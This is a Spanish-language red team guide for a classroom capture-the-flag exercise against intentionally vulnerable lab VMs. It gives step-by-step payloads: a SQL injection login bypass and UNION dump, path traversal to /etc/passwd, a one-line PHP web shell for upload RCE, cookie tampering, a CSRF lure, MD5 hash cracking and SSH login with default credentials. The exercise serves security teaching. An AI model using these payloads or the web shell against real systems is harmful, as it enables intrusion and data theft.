# Red Team Playbook - CTF UCC 15 vs 15

> Guia rapida para los 15 estudiantes que atacan los labs IDS / UWS.
> Cada vector da una bandera. Hay 7 vectores web + 1 SSH = 8 banderas por lab.
> Multiples vectores son **independientes**: un grupo puede ir por SQLi mientras
> otro va por Upload RCE sin pisarse.

## URLs

Cada lab vive en una VM distinta dentro de la misma red de clase. Pidan al
instructor las IPs y el puerto del scoreboard.

| Recurso          | URL / comando                                 |
|------------------|-----------------------------------------------|
| Lab IDS          | http://`<IP-VM1>`:8080                        |
| Lab UWS          | http://`<IP-VM2>`:8081                        |
| Scoreboard 15v15 | http://`<IP-LXC>`:9000 (un solo LXC)          |
| SSH IDS          | `ssh admin@<IP-VM1> -p 2222` (`password123`)  |
| SSH UWS          | `ssh admin@<IP-VM2> -p 2223` (`password123`)  |

> En el dashboard de cada lab, si el instructor configuro la variable
> `SCOREBOARD_URL`, veran un banner naranja/azul con el link directo.

## Tabla de vectores

| # | Vector              | Punto de entrada                      | Bandera                       | Pts |
|---|---------------------|---------------------------------------|-------------------------------|-----|
| 1 | SQL Injection       | `/index.php` login                    | aleatoria | 50  |
| 2 | Cookie tamper       | `/admin.php` con cookie `role=admin`  | aleatoria | 75 |
| 3 | LFI                 | `/download.php?file=...`              | aleatoria | 60  |
| 4 | LFI -> config leak  | `/download.php?file=../config/app.ini`| aleatoria | 70 |
| 5 | Command Injection   | `/network.php`                        | aleatoria | 80  |
| 6 | Upload RCE          | `/upload.php`                         | aleatoria | 120 |
| 7 | Hash cracking       | tabla `secrets`                       | aleatoria | 100 |
| 8 | SSH pivot           | `ssh admin@... -p 2222/2223`          | aleatoria | 150 |

El valor lo registra el scoreboard al iniciar la partida. El formato es `FLAG{345_gonasf_32v}`.

## Quick wins por subgrupo (Red Team de 15 → 5 trios)

### Trio 1 - SQLi + cookie
1. `' OR '1'='1' -- ` en el campo usuario.
2. Submit.
3. Ya estan dentro como `root` o `admin`. Nota la bandera SQLi.
4. Visiten `/admin.php` con la cookie `role=admin` (DevTools → Application → Cookies).
5. La bandera intermedia aparece en pantalla.

### Trio 2 - LFI / config leak
1. Despues del SQLi, vayan a `/download.php`.
2. Probar nombres del bucket (`admin_notes.md`) → bandera LFI.
3. Probar `?file=../config/app.ini` → bandera de config leak.
4. Bonus: leer `/etc/passwd` con `?file=../../../../../etc/passwd`.

### Trio 3 - Command Injection
1. Ir a `/network.php`.
2. La propia pagina lista la nota interna de ese vector.

### Trio 4 - Upload RCE + CSRF
1. Crear `shell.php` localmente con:
   ```php
   <?php system($_GET['c']); ?>
   ```
2. Subirlo via `/upload.php`.
3. La pagina `/upload.php` lista la nota interna de ese vector.
4. Bonus CSRF: subir `attacker.html` (template en `docs/csrf_demo/attacker.html`)
   y compartir el link con un compañero del Blue Team logueado.

### Trio 5 - Hash cracking + SSH
1. SQLi UNION para listar la tabla `secrets`:
   ```
   ' UNION SELECT 1,label,value FROM secrets -- 
   ```
2. Copiar los 3 hashes MD5 → `hashcat -m 0 -a 0 hashes.txt rockyou.txt`.
3. Pega los plaintext y envíen la bandera aleatoria de ese vector.
4. Con `admin/password123` hagan `ssh admin@<ip> -p 2222` (IDS) o `2223` (UWS).
5. `cat /home/admin/flag.txt` → bandera final.

## Tips
- **Honeypots**: hay 3 banderas trampa con el mismo formato que las reales.
  **No las envien**: restan puntos.
- **Fingerprinting**: `/robots.txt` lista los endpoints "ocultos" con un TODO
  asociado. Es su roadmap rapido.
- **Scoreboard**: enviar varias veces la misma bandera no suma. El primer
  envio del equipo es el que cuenta.
